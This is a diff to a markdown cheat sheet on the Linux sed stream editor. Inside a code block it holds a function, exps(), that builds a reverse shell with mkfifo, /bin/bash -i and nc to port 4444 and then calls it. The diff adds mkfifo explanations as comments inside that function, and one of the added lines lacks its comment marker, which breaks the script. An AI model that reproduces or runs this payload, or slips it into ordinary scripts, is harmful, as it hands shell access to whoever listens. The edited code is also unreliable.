@@ -1,4 +1,4 @@
-# SED Command cheat sheet in linux
+# SED Command cheat sheet in linux | mkfifo
 SED command in UNIX stands for stream editor and it can perform lots of functions on files like searching, find and replace, insertion or deletion. Though most common use of SED command in UNIX is for substitution or for find and replace.
 
 #### Situations you can use SED
@@ -259,6 +259,15 @@ nano demo
 ```
 exps(){
 rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 127.0.0.1 4444 > /tmp/f &
+# What is mkfifo
+# First In, First Out
+#
+In a Linux directory listing, the letter p in the file permissions indicates that the file is a named pipe,
+# which is created using the mkfifo command.
+# Named pipes are also referred to as FIFOs (First In, First Out) and are a form of interprocess communication.
+# or
+# mkfifo is a command in Linux used to create a special type of file called a FIFO (First In, First Out).
+# A FIFO is also known as a named pipe, and it provides a mechanism for interprocess communication (IPC) between two processes.
 }
 exps
 ```
